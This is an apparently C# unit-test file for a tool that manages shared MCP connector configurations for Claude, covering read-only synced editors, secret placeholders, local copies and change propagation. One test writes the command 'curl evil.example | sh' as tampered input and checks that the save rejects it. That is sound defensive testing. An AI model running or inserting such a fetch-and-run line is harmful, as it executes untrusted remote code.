using ConnectorControl.Core.State;
using ConnectorControl.Core.Tests.TestSupport;

namespace ConnectorControl.Core.Tests.State;

/// <summary>
/// Tests/ConnectorControlStateTests/EditorModelCollectionsTests.swift. The editor once it knows
/// which collection it is editing: the four header states, a synced connector's read-only form
/// with its placeholders still live, Make Local Copy, and the propagate line.
/// </summary>
public class EditorModelCollectionsTests
{
    /// <summary>
    /// Subscribes the rig's state to the sample document on disk, so "Data team" is a real synced
    /// collection with a marker in an env value, in an argument and in a bearer token.
    /// </summary>
    private static void SubscribeToDataTeam(EditorRig rig)
    {
        var path = rig.H.Dir.File(Path.Combine("shared", "data-team.json"));
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllBytes(path, CollectionDocumentSamples.DataTeam.Serialize());
        Assert.Null(rig.State.Subscribe(path, null));
    }

    private static EnvRow EnvRow(EditorModel editor, string name) =>
        editor.EnvRows.Single(r => r.Name == name);

    // MARK: read-only

    [Fact]
    public void ASyncedConnectorOpensReadOnlyWithLivePlaceholders()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);

        using var dbt = rig.Editor("dbt", "Data team");
        Assert.True(dbt.IsReadOnly);
        Assert.Equal(new EditorModel.HeaderState.Synced("Data team"), dbt.Header);
        Assert.Equal("Synced from Data team · read-only", dbt.HeaderNote);
        // Make Local Copy… takes Remove's slot.
        Assert.False(dbt.CanRemove);
        // The placeholder fields are editable, so Save stays enabled.
        Assert.True(dbt.CanSave);
        // The paste tip offers something a read-only JSON view cannot do.
        Assert.False(dbt.ShowJsonTip);

        var token = EnvRow(dbt, "DBT_TOKEN");
        Assert.True(dbt.IsPlaceholder(token));
        Assert.Equal("cloud.getdbt.com ▸ API tokens", dbt.PlaceholderHint(token));
        var region = EnvRow(dbt, "DBT_REGION");
        // A shared value is not asking for anything.
        Assert.False(dbt.IsPlaceholder(region));
        Assert.Null(dbt.PlaceholderHint(region));
        // dbt's arguments are the author's own.
        Assert.Empty(dbt.ArgsWithPlaceholders);

        using var ledger = rig.Editor("ledger", "Data team");
        Assert.Equal([0], ledger.ArgsWithPlaceholders);
        Assert.Equal("your ledger clone, then dist/index.js", ledger.PlaceholderHintForArg(0));
        // An index past the end has nothing to say.
        Assert.Null(ledger.PlaceholderHintForArg(7));

        using var notion = rig.Editor("notion", "Data team");
        Assert.True(notion.BearerTokenIsPlaceholder);
        Assert.Equal("notion.so ▸ integrations", notion.BearerTokenHint);
        Assert.False(notion.HeaderValueIsPlaceholder);
        Assert.False(notion.ClientSecretIsPlaceholder);

        // A filled field stops asking, the moment it is filled.
        notion.BearerToken = "secret_abc";
        Assert.False(notion.BearerTokenIsPlaceholder);
        Assert.Null(notion.BearerTokenHint);
    }

    [Fact]
    public void ALocalConnectorIsNeitherReadOnlyNorPlaceholdered()
    {
        using var rig = new EditorRig();

        using var editor = rig.Editor("scoutbook", "Default");
        Assert.False(editor.IsReadOnly);
        Assert.Equal(new EditorModel.HeaderState.None(), editor.Header);
        Assert.Null(editor.HeaderNote);
        Assert.True(editor.CanRemove);
        Assert.True(editor.ShowJsonTip);
        Assert.False(editor.BearerTokenIsPlaceholder);
        Assert.Empty(editor.ArgsWithPlaceholders);
    }

    [Fact]
    public void SavingASyncedConnectorWritesOnlyPlaceholdersAndEnabled()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;
        // Everything a subscription lands arrives off; switching makes this the collection Claude
        // runs, so the enabled flag the row owns has somewhere to be seen.
        state.SwitchCollection("Data team");
        state.SetEnabled("dbt", true);
        var opened = state.Store.Collections["Data team"].Mcps["dbt"].Config;

        using var editor = rig.Editor("dbt", "Data team");
        // Everything the author owns, tampered with through the model the view locks.
        editor.Name = "not-dbt";
        editor.Command = "cmd";
        editor.Args.Clear();
        editor.Args.Add(new ArgRow("/c"));
        editor.Args.Add(new ArgRow("curl evil.example | sh"));
        EnvRow(editor, "DBT_REGION").Value = "eu";
        // The one thing this machine is asked for.
        EnvRow(editor, "DBT_TOKEN").Value = "dbt_pat_123";

        Assert.True(editor.Save());
        var saved = state.Store.Collections["Data team"].Mcps["dbt"];
        // The name is the author's.
        Assert.False(state.Store.Collections["Data team"].Mcps.ContainsKey("not-dbt"));
        // The command, the arguments and the shared env value are untouched.
        Assert.Equal(opened.Replacing(new JsonPointer(["env", "DBT_TOKEN"]), JsonValue.String("dbt_pat_123")), saved.Config);
        // The switch this machine owns survives the save.
        Assert.True(saved.Enabled);
        // The filled value reaches Claude.
        Assert.Equal(saved.Config, rig.H.ClaudeServers()["dbt"]);
    }

    [Fact]
    public void ASyncedSaveInAnInactiveCollectionPersistsWithoutTouchingClaude()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;
        Assert.Equal("Default", state.ActiveCollection);
        var before = rig.H.ClaudeServers();

        using var editor = rig.Editor("ledger", "Data team");
        editor.Args[0].Value = @"C:\code\ledger\dist\index.js";
        Assert.True(editor.Save());

        Assert.Equal(
            JsonValue.String(@"C:\code\ledger\dist\index.js"),
            state.Store.Collections["Data team"].Mcps["ledger"].Config.ValueAt(new JsonPointer(["args", "0"])));
        // Claude runs the active collection and nothing else.
        Assert.Equal(before, rig.H.ClaudeServers());
        // It is on disk all the same.
        Assert.Equal(
            state.Store.Collections["Data team"].Mcps["ledger"].Config,
            rig.H.StoreOnDisk().Collections["Data team"].Mcps["ledger"].Config);
    }

    [Fact]
    public void AReadOnlySaveFillsAMarkerWhereverItSits()
    {
        using var rig = new EditorRig();
        // A remote connector's secret is never a leaf of its own: a bearer token rides in the env
        // value the --header flag indirects through, and a client secret inside a JSON blob in an
        // argument. Both reach the user through the local form, because a bridge invocation
        // carrying auth flags is not the canonical two-argument shape the remote form detects.
        var sample = CollectionDocumentSamples.DataTeam;
        var connectors = new Dictionary<string, CollectionDocument.Connector>(sample.Connectors, StringComparer.Ordinal)
        {
            ["billing"] = new(
                new CollectionDocument.Launcher.Remote(
                    "https://mcp.billing.example/", new CollectionDocument.Auth.OAuthClient("cc-app", "read"), "mcp-remote", []),
                new Dictionary<string, CollectionDocument.EnvValue>(),
                new Dictionary<string, string?> { ["client_secret"] = "the billing console" },
                new Dictionary<string, JsonValue>()),
        };
        var path = rig.H.Dir.File(Path.Combine("shared", "data-team.json"));
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllBytes(path, new CollectionDocument(sample.Name, sample.Author, sample.Origin, sample.Exported, connectors).Serialize());
        var state = rig.State;
        Assert.Null(state.Subscribe(path, null));

        using var notion = rig.Editor("notion", "Data team");
        // The --header flags take it out of the remote form.
        Assert.False(notion.IsRemote);
        // The decoded token is a marker all the same.
        Assert.True(notion.BearerTokenIsPlaceholder);
        Assert.Equal("notion.so ▸ integrations", notion.BearerTokenHint);
        var openedNotion = state.Store.Collections["Data team"].Mcps["notion"].Config;
        var header = EnvRow(notion, "AUTH_HEADER");
        Assert.True(notion.IsPlaceholder(header));
        header.Value = "Bearer secret_abc";
        notion.Command = "cmd";
        Assert.True(notion.Save());
        var savedNotion = state.Store.Collections["Data team"].Mcps["notion"].Config;
        Assert.Equal(JsonValue.String("Bearer secret_abc"), savedNotion.ValueAt(new JsonPointer(["env", "AUTH_HEADER"])));
        AssertOnlyMarkedLeavesMoved(openedNotion, savedNotion);

        using var billing = rig.Editor("billing", "Data team");
        Assert.True(billing.ClientSecretIsPlaceholder);
        Assert.Equal("the billing console", billing.ClientSecretHint);
        var openedBilling = state.Store.Collections["Data team"].Mcps["billing"].Config;
        var blob = Assert.Single(billing.ArgsWithPlaceholders);
        Assert.Equal("the billing console", billing.PlaceholderHintForArg(blob));
        billing.Args[blob].Value = """{"client_id":"cc-app","client_secret":"shh"}""";
        Assert.True(billing.Save());
        var savedBilling = state.Store.Collections["Data team"].Mcps["billing"].Config;
        Assert.Equal(JsonValue.String("""{"client_id":"cc-app","client_secret":"shh"}"""),
                     savedBilling.ValueAt(new JsonPointer(["args", blob.ToString(System.Globalization.CultureInfo.InvariantCulture)])));
        AssertOnlyMarkedLeavesMoved(openedBilling, savedBilling);
    }

    /// <summary>
    /// Every string in the config as it opened that was not a marker is still exactly where and
    /// what the author left it.
    /// </summary>
    private static void AssertOnlyMarkedLeavesMoved(JsonValue opened, JsonValue saved)
    {
        foreach (var leaf in opened.StringLeaves())
        {
            if (!Placeholder.ContainsMarker(leaf.Value))
            {
                Assert.Equal(JsonValue.String(leaf.Value), saved.ValueAt(leaf.Pointer));
            }
        }
    }

    // MARK: header states

    [Fact]
    public void HeaderStatesFollowTheCollection()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;

        using (var plain = rig.Editor("scoutbook", "Default"))
        {
            Assert.Equal(new EditorModel.HeaderState.None(), plain.Header);
        }
        using (var synced = rig.Editor("dbt", "Data team"))
        {
            Assert.Equal(new EditorModel.HeaderState.Synced("Data team"), synced.Header);
        }

        Assert.Null(state.MakeLocalCopy(["dbt"], "Data team", "Default"));
        var date = state.CollectionsFile.Collections["Default"].Provenance["dbt"].Date;
        using (var imported = rig.Editor("dbt", "Default"))
        {
            Assert.Equal(new EditorModel.HeaderState.Imported("Data team", date), imported.Header);
            Assert.Equal($"Imported from “Data team” on {date}. Edits stay here.", imported.HeaderNote);
            // A copy is the user's own.
            Assert.False(imported.IsReadOnly);
        }

        var folder = rig.H.Dir.File("share");
        Directory.CreateDirectory(folder);
        Assert.Null(state.CreateCollection("Team"));
        Assert.Null(state.StartPublishing("Team", folder, PublishIntent.None));
        using var published = rig.Editor("scoutbook", "Team");
        Assert.Equal(new EditorModel.HeaderState.Published(folder), published.Header);
        Assert.Equal($"Published to {folder} — saving updates the file your team reads. Secrets stay here.",
                     published.HeaderNote);
        Assert.False(published.IsReadOnly);
        Assert.True(published.CanRemove);
    }

    // MARK: Make Local Copy

    [Fact]
    public void MakeLocalCopyFromTheEditor()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;

        using var editor = rig.Editor("notion", "Data team");
        Assert.Equal("Make Local Copy…", EditorModel.MakeLocalCopyButton);
        Assert.Null(editor.MakeLocalCopy("Default"));
        // The copy carries its unfilled marker, exactly as it stands.
        Assert.Equal(state.Store.Collections["Data team"].Mcps["notion"].Config,
                     state.Store.Collections["Default"].Mcps["notion"].Config);
        Assert.False(state.Store.Collections["Default"].Mcps["notion"].Enabled);
        Assert.Equal("Data team", state.CollectionsFile.Collections["Default"].Provenance["notion"].From);

        // A synced collection is nobody's copy target.
        Assert.Equal(AppState.TargetMustBeLocalError, editor.MakeLocalCopy("Data team"));
    }

    // MARK: propagate

    [Fact]
    public void PropagateAppliesTheChangeToIdenticalTwins()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        // A copy of Default, and now active.
        Assert.Null(state.CreateCollection("Backup"));
        state.SetEnabled("scoutbook", false);
        state.SwitchCollection("Default");

        using var editor = rig.Editor("scoutbook", "Default");
        Assert.Equal(["Backup"], editor.PropagateTargets);
        Assert.True(editor.ShowPropagate);
        // Off unless the user ticks it.
        Assert.False(editor.Propagate);
        Assert.Equal("Also apply this change to Backup, which has an identical scoutbook", editor.PropagateMessage);

        editor.Propagate = true;
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        Assert.True(editor.Save());

        var updated = state.Store.Collections["Default"].Mcps["scoutbook"];
        Assert.Contains("/mcp/v2", updated.Config.EditorText(), StringComparison.Ordinal);
        Assert.Equal(updated.Config, state.Store.Collections["Backup"].Mcps["scoutbook"].Config);
        // The twin's own on/off state is not part of the change.
        Assert.False(state.Store.Collections["Backup"].Mcps["scoutbook"].Enabled);
        Assert.True(updated.Enabled);
    }

    [Fact]
    public void AnUntickedPropagateLeavesTheTwinAlone()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Backup"));
        state.SwitchCollection("Default");
        var twin = state.Store.Collections["Backup"].Mcps["scoutbook"].Config;

        using var editor = rig.Editor("scoutbook", "Default");
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        Assert.True(editor.Save());

        Assert.Equal(twin, state.Store.Collections["Backup"].Mcps["scoutbook"].Config);
    }

    [Fact]
    public void PropagateSkipsATwinThatMovedWhileTheWindowWasOpen()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Backup"));
        state.SwitchCollection("Default");

        using var editor = rig.Editor("scoutbook", "Default");
        Assert.Equal(["Backup"], editor.PropagateTargets);
        // A second window on the twin saved first — the checkbox's promise no longer holds for it.
        var moved = new McpEntry(AppStateHarness.Remote("https://scoutbook.example.com/mcp/other"));
        Assert.Null(state.Upsert("scoutbook", moved, "scoutbook", "Backup"));

        editor.Propagate = true;
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        Assert.True(editor.Save());

        // A twin that is no longer identical keeps what it says.
        Assert.Equal(moved.Config, state.Store.Collections["Backup"].Mcps["scoutbook"].Config);
        // The save itself still lands.
        Assert.Contains("/mcp/v2", state.Store.Collections["Default"].Mcps["scoutbook"].Config.EditorText(),
                        StringComparison.Ordinal);
    }

    [Fact]
    public void PropagatingIntoTheActiveCollectionReachesClaudeOnce()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        // Edit the inactive side and propagate inward: the twin Claude runs is the one that moves.
        Assert.Null(state.CreateCollection("Spare"));
        state.SwitchCollection("Default");
        var appliedBefore = rig.H.Settings.LastApplyDate;

        using var editor = rig.Editor("scoutbook", "Spare");
        Assert.Equal(["Default"], editor.PropagateTargets);
        editor.Propagate = true;
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        rig.H.Now = rig.H.Now.AddMinutes(1);
        Assert.True(editor.Save());

        var updated = state.Store.Collections["Default"].Mcps["scoutbook"].Config;
        Assert.Contains("/mcp/v2", updated.EditorText(), StringComparison.Ordinal);
        // Claude follows the active collection.
        Assert.Equal(updated, rig.H.ClaudeServers()["scoutbook"]);
        // The save applied.
        Assert.NotEqual(appliedBefore, rig.H.Settings.LastApplyDate);
        Assert.Equal(rig.H.Now, rig.H.Settings.LastApplyDate);
        // One apply, and it came after every write: an apply that ran before the propagated
        // collection was written would leave the store dirty behind it.
        Assert.False(state.IsDirty);
        Assert.Equal(updated, state.Store.Collections["Spare"].Mcps["scoutbook"].Config);
    }

    [Fact]
    public void PropagateCarriesARenameToTheTwin()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Backup"));
        state.SwitchCollection("Default");

        using var editor = rig.Editor("scoutbook", "Default");
        editor.Propagate = true;
        editor.Name = "scouts";
        Assert.True(editor.Save());

        Assert.False(state.Store.Collections["Backup"].Mcps.ContainsKey("scoutbook"));
        Assert.True(state.Store.Collections["Backup"].Mcps.ContainsKey("scouts"));
        Assert.False(state.Store.Collections["Default"].Mcps.ContainsKey("scoutbook"));
        Assert.True(state.Store.Collections["Default"].Mcps.ContainsKey("scouts"));
    }

    [Fact]
    public void PropagateLeavesACollectionWhoseNewNameIsTakenAlone()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Backup"));
        state.SwitchCollection("Default");
        // "Backup" already has something called "scouts", so the rename cannot land there.
        var occupant = new McpEntry(AppStateHarness.Remote("https://scouts.example/mcp"));
        Assert.Null(state.Upsert("scouts", occupant, null, "Backup"));

        using var editor = rig.Editor("scoutbook", "Default");
        editor.Propagate = true;
        editor.Name = "scouts";
        // The save the user asked for still lands.
        Assert.True(editor.Save());

        // The name was taken, so that collection is left as it was.
        Assert.Equal(occupant.Config, state.Store.Collections["Backup"].Mcps["scouts"].Config);
        Assert.True(state.Store.Collections["Backup"].Mcps.ContainsKey("scoutbook"));
        Assert.True(state.Store.Collections["Default"].Mcps.ContainsKey("scouts"));
    }

    [Fact]
    public void PropagateIsOfferedOnlyForIdenticalLocalTwins()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;

        // A twin whose config has moved on is not the same connector any more.
        Assert.Null(state.CreateCollection("Other"));
        state.SwitchCollection("Default");
        Assert.Null(state.Upsert("scoutbook", new McpEntry(AppStateHarness.Remote("https://elsewhere.example/mcp")),
                                 "scoutbook", "Other"));
        using (var editor = rig.Editor("scoutbook", "Default"))
        {
            Assert.Empty(editor.PropagateTargets);
            Assert.False(editor.ShowPropagate);
        }

        // A synced collection holding the very same connector is never a propagate target, in
        // either direction: its copy belongs to its author.
        Assert.Null(state.MakeLocalCopy(["notion"], "Data team", "Default"));
        using (var local = rig.Editor("notion", "Default"))
        {
            Assert.Empty(local.PropagateTargets);
        }
        using (var synced = rig.Editor("notion", "Data team"))
        {
            Assert.Empty(synced.PropagateTargets);
        }

        // A connector that does not exist yet has no twins.
        using var fresh = rig.Editor(EditTarget.New(rig.Local("node", ["x.js"])));
        Assert.Empty(fresh.PropagateTargets);
    }

    // MARK: targets

    [Fact]
    public void ATargetNamesItsCollectionAndOpensItsOwnWindow()
    {
        var entry = new McpEntry(AppStateHarness.Remote("https://x.example/mcp"));
        var active = EditTarget.Existing("x", entry);
        var team = EditTarget.Existing("x", entry, "Team");
        Assert.Null(active.Collection);
        Assert.Equal("Team", team.Collection);
        // The active collection's editor keeps the id it always had.
        Assert.Equal("x", active.Id);
        Assert.NotEqual(team.Id, active.Id);
        Assert.NotEqual(team, active);
        Assert.Null(EditTarget.NewRemote(RemoteLaunchStyle.CmdNpx).Collection);
        Assert.Equal("Team", EditTarget.NewRemote(RemoteLaunchStyle.CmdNpx, "Team").Collection);
    }
    /// <summary>
    /// The Mac has no mirror of this: there the secret fields and the JSON error are
    /// <c>@Published</c>, so a change to one republishes the whole object. Here they are plain
    /// properties, and what a synced editor unlocks is read off their text, so the text and the
    /// two things derived from it have to be announced together. Without these raises the editor
    /// window has to work the answers out for itself.
    /// </summary>
    [Fact]
    public void FillingASecretFieldRaisesWhatIsReadOffIt()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        using var notion = rig.Editor("notion", "Data team");
        var raised = new List<string>();
        notion.PropertyChanged += (_, e) => raised.Add(e.PropertyName ?? "");

        Assert.True(notion.BearerTokenIsPlaceholder);
        notion.BearerToken = "secret_abc";
        Assert.Contains(nameof(EditorModel.BearerTokenIsPlaceholder), raised);
        Assert.Contains(nameof(EditorModel.BearerTokenHint), raised);
        Assert.False(notion.BearerTokenIsPlaceholder);
        Assert.Null(notion.BearerTokenHint);

        // Typing the same text again says nothing.
        raised.Clear();
        notion.BearerToken = "secret_abc";
        Assert.Empty(raised);

        // The other two secrets answer the same way.
        raised.Clear();
        notion.HeaderValue = Placeholder.Marker("header_value");
        Assert.Contains(nameof(EditorModel.HeaderValueIsPlaceholder), raised);
        Assert.Contains(nameof(EditorModel.HeaderValueHint), raised);
        Assert.True(notion.HeaderValueIsPlaceholder);

        raised.Clear();
        notion.OAuthClientSecret = Placeholder.Marker("client_secret");
        Assert.Contains(nameof(EditorModel.ClientSecretIsPlaceholder), raised);
        Assert.Contains(nameof(EditorModel.ClientSecretHint), raised);
        Assert.True(notion.ClientSecretIsPlaceholder);
    }

    /// <summary>
    /// C#-only: <c>jsonError</c> is @Published on the Mac, so the tip re-reads without anything
    /// raising for it.
    /// </summary>
    [Fact]
    public void TheJsonTipFollowsTheJsonError()
    {
        using var rig = new EditorRig();
        using var editor = rig.Editor(EditTarget.New(rig.Local("node", ["x.js"])));
        Assert.True(editor.ShowJsonTip);
        var raised = new List<string>();
        editor.PropertyChanged += (_, e) => raised.Add(e.PropertyName ?? "");

        editor.View = EditView.Json;
        editor.JsonText = "{not json";
        Assert.NotNull(editor.JsonError);
        Assert.False(editor.ShowJsonTip);
        Assert.Contains(nameof(EditorModel.ShowJsonTip), raised);

        raised.Clear();
        editor.JsonText = "{}";
        Assert.Null(editor.JsonError);
        Assert.True(editor.ShowJsonTip);
        Assert.Contains(nameof(EditorModel.ShowJsonTip), raised);
    }
    // MARK: the open-time snapshot

    [Fact]
    public void WhatAFieldWasAskingForIsFixedWhenTheWindowOpens()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);

        using var dbt = rig.Editor("dbt", "Data team");
        var token = EnvRow(dbt, "DBT_TOKEN");
        Assert.True(dbt.AsksFor(token));
        Assert.True(dbt.IsPlaceholder(token));
        // Filling it answers the question; it does not hand the field back to the lock.
        token.Value = "secret_abc";
        Assert.False(dbt.IsPlaceholder(token));
        Assert.True(dbt.AsksFor(token), "the field being typed into stays the live one");
        // A row that was not asking never becomes live, whatever is typed into it.
        Assert.False(dbt.AsksFor(EnvRow(dbt, "DBT_REGION")));

        using var ledger = rig.Editor("ledger", "Data team");
        Assert.Equal([0], ledger.ArgsWithPlaceholders);
        Assert.True(ledger.AsksForArg(0));
        ledger.Args[0].Value = "/Users/d/ledger/dist/index.js";
        Assert.Empty(ledger.ArgsWithPlaceholders);
        Assert.True(ledger.AsksForArg(0));
        // An index past the end asks for nothing.
        Assert.False(ledger.AsksForArg(7));
        // Keyed by the row, not the position: a row inserted above carries the answer with it.
        ledger.Args.Insert(0, new ArgRow("--quiet"));
        Assert.False(ledger.AsksForArg(0));
        Assert.True(ledger.AsksForArg(1));

        using var notion = rig.Editor("notion", "Data team");
        Assert.True(notion.AsksForBearerToken);
        notion.BearerToken = "secret_abc";
        // The ring and the hint follow the text; the lock does not.
        Assert.False(notion.BearerTokenIsPlaceholder);
        Assert.True(notion.AsksForBearerToken);
        Assert.False(notion.AsksForHeaderValue);
        Assert.False(notion.AsksForClientSecret);
    }

    // MARK: published hints

    [Fact]
    public void APublishedConnectorCarriesTheAuthorsHintForEachStrippedValue()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Team"));
        Assert.Null(state.Upsert("svc", new McpEntry(JsonValue.Object(
            ("command", JsonValue.String("node")),
            ("args", JsonValue.Array([JsonValue.String("/Users/d/server.js")])),
            ("env", JsonValue.Object(("TOKEN", JsonValue.String("sk-live")), ("REGION", JsonValue.String("us")))))),
            null, "Team"));
        var folder = rig.H.Dir.File("share");
        Directory.CreateDirectory(folder);
        var pointer = new JsonPointer(["args", "0"]);
        var intent = new PublishIntent(
            [new("svc", new HashSet<string>(["REGION"], StringComparer.Ordinal))],
            [new("svc", new Dictionary<JsonPointer, PublishIntent.PathMark>
            {
                [pointer] = new("server_path", "your clone, then dist/index.js"),
            })],
            [new("svc", new Dictionary<string, string>(StringComparer.Ordinal)
            {
                ["TOKEN"] = "acme.example ▸ API tokens",
            })]);
        Assert.Null(state.StartPublishing("Team", folder, intent));

        using var editor = rig.Editor("svc", "Team");
        Assert.True(editor.HasPublishedHints);
        var token = EnvRow(editor, "TOKEN");
        Assert.Equal("acme.example ▸ API tokens", editor.PublishedHint(token));
        // A shared value is not stripped, so the author owes no explanation for it.
        Assert.Null(editor.PublishedHint(EnvRow(editor, "REGION")));
        Assert.Equal("your clone, then dist/index.js", editor.PublishedHintForArg(0));
        Assert.Null(editor.PublishedHintForArg(7));

        // A published collection's editor adds and removes arguments freely, and the record
        // keys the hint by where the marker sat, so the answer follows the row rather than the
        // position it happens to hold now.
        editor.Args.Insert(0, new ArgRow("--quiet"));
        Assert.Null(editor.PublishedHintForArg(0));   // a row added since the window opened
        Assert.Equal("your clone, then dist/index.js", editor.PublishedHintForArg(1));
        editor.Args.RemoveAt(0);
        Assert.Equal("your clone, then dist/index.js", editor.PublishedHintForArg(0));
        // A different question from the synced sidecar's needs, which say nothing here.
        Assert.Null(editor.PlaceholderHint(token));

        // A local collection nobody publishes has none of this to say.
        using var plain = rig.Editor("scoutbook", "Default");
        Assert.False(plain.HasPublishedHints);
        Assert.Null(plain.PublishedHintForArg(0));

        // The record without this machine's binding is another machine's publish, and the hints
        // are that machine's business, not this editor's.
        new CollectionsLocalCache([], []).Save(state.Service.Paths.CollectionsCachePath);
        state.Reload();
        using var elsewhere = rig.Editor("svc", "Team");
        Assert.True(state.IsPublished("Team"), "the sidecar still carries the record");
        Assert.False(elsewhere.HasPublishedHints);
        Assert.Null(elsewhere.PublishedHint(EnvRow(elsewhere, "TOKEN")));
        Assert.Null(elsewhere.PublishedHintForArg(0));
    }

    /// <summary>
    /// C#-only: SwiftUI switches on the HeaderState enum itself, so the Mac needs no bools to
    /// tell the four states apart.
    /// </summary>
    [Fact]
    public void EachHeaderStateSaysWhichOneItIs()
    {
        Assert.True(new EditorModel.HeaderState.Synced("Team").IsSynced);
        Assert.True(new EditorModel.HeaderState.Published("/share").IsPublished);
        Assert.True(new EditorModel.HeaderState.Imported("Team", "2026-09-21").IsImported);
        var none = new EditorModel.HeaderState.None();
        Assert.False(none.IsSynced);
        Assert.False(none.IsPublished);
        Assert.False(none.IsImported);
        // Exactly one at a time, so a view can bind three visibilities and get one header.
        var synced = new EditorModel.HeaderState.Synced("Team");
        Assert.False(synced.IsPublished);
        Assert.False(synced.IsImported);
    }

    /// <summary>
    /// C#-only: the Mac's model republishes as a whole on any AppState change, so there is no
    /// per-property raise to assert.
    /// </summary>
    [Fact]
    public void TheCollectionsOwnAnswersFollowAppStateWithoutReseatingTheView()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        using var dbt = rig.Editor("dbt", "Data team");
        Assert.True(dbt.IsReadOnly);
        var raised = new List<string>();
        dbt.PropertyChanged += (_, e) => raised.Add(e.PropertyName ?? "");

        // Detaching the collection unlocks the form; the window used to re-seat its DataContext
        // to notice, which regenerated every row and took the caret with it.
        rig.State.StopSyncing("Data team");
        Assert.False(dbt.IsReadOnly);
        Assert.Contains(nameof(EditorModel.IsReadOnly), raised);
        Assert.Contains(nameof(EditorModel.Header), raised);
        Assert.Contains(nameof(EditorModel.HeaderNote), raised);
        Assert.Contains(nameof(EditorModel.HasHeaderNote), raised);
        Assert.Contains(nameof(EditorModel.CanRemove), raised);
        Assert.Contains(nameof(EditorModel.ShowJsonTip), raised);
        Assert.Contains(nameof(EditorModel.HasPublishedHints), raised);
    }
    [Fact]
    public void StopSyncingRetakesTheSnapshotSoAFilledSecretIsMaskedAgain()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        using var notion = rig.Editor("notion", "Data team");
        Assert.True(notion.IsReadOnly);
        Assert.True(notion.AsksForBearerToken);
        var raised = new List<string>();
        notion.PropertyChanged += (_, e) => raised.Add(e.PropertyName ?? "");

        // Filled while the form still locks everything else: the field stays the live one, so
        // the user can keep typing into it.
        notion.BearerToken = "secret_abc";
        Assert.True(notion.AsksForBearerToken);

        // Stop Syncing turns the whole form into an ordinary editable one. What the user filled
        // is now an ordinary secret and must stop being rendered in the clear.
        rig.State.StopSyncing("Data team");
        Assert.False(notion.IsReadOnly);
        Assert.False(notion.AsksForBearerToken);
        Assert.Contains(nameof(EditorModel.AsksForBearerToken), raised);

        // A field still holding its marker is still owed, locked form or not.
        using var dbt = rig.Editor("dbt", "Data team");
        var token = EnvRow(dbt, "DBT_TOKEN");
        Assert.False(dbt.IsReadOnly);   // the collection is local now
        Assert.True(dbt.AsksFor(token));
        Assert.True(dbt.IsPlaceholder(token));
    }
    // MARK: a JSON round trip keeps both records

    [Fact]
    public void AJsonRoundTripKeepsWhatASyncedFormAskedFor()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);

        // The round trip rebuilds every row; the record has to recognise the rebuilt ones.
        using var dbt = rig.Editor("dbt", "Data team");
        dbt.RequestView(EditView.Json);
        dbt.RequestView(EditView.Form);
        Assert.Equal(EditView.Form, dbt.View);
        // The placeholder field stays live, so the value can still be filled.
        Assert.True(dbt.AsksFor(EnvRow(dbt, "DBT_TOKEN")));
        Assert.False(dbt.AsksFor(EnvRow(dbt, "DBT_REGION")));

        using var ledger = rig.Editor("ledger", "Data team");
        ledger.RequestView(EditView.Json);
        ledger.RequestView(EditView.Form);
        Assert.True(ledger.AsksForArg(0));

        // Carried, not retaken: a value filled before the trip keeps its field live.
        EnvRow(dbt, "DBT_TOKEN").Value = "secret_abc";
        dbt.RequestView(EditView.Json);
        dbt.RequestView(EditView.Form);
        Assert.True(dbt.AsksFor(EnvRow(dbt, "DBT_TOKEN")));

        // The auth flags are not row-keyed, so a round trip has nothing to carry for them.
        using var notion = rig.Editor("notion", "Data team");
        notion.RequestView(EditView.Json);
        notion.RequestView(EditView.Form);
        Assert.True(notion.AsksForBearerToken);
    }

    [Fact]
    public void AJsonRoundTripKeepsAPublishedArgumentsHint()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Team"));
        Assert.Null(state.Upsert("svc", new McpEntry(JsonValue.Object(
            ("command", JsonValue.String("node")),
            ("args", JsonValue.Array([JsonValue.String("/Users/d/server.js")])))), null, "Team"));
        var folder = rig.H.Dir.File("share");
        Directory.CreateDirectory(folder);
        var intent = new PublishIntent(
            [],
            [new("svc", new Dictionary<JsonPointer, PublishIntent.PathMark>
            {
                [new JsonPointer(["args", "0"])] = new("server_path", "your clone"),
            })],
            []);
        Assert.Null(state.StartPublishing("Team", folder, intent));

        using var editor = rig.Editor("svc", "Team");
        Assert.Equal("your clone", editor.PublishedHintForArg(0));
        editor.RequestView(EditView.Json);
        editor.RequestView(EditView.Form);
        // The hint survives an unchanged round trip.
        Assert.Equal("your clone", editor.PublishedHintForArg(0));
    }
}
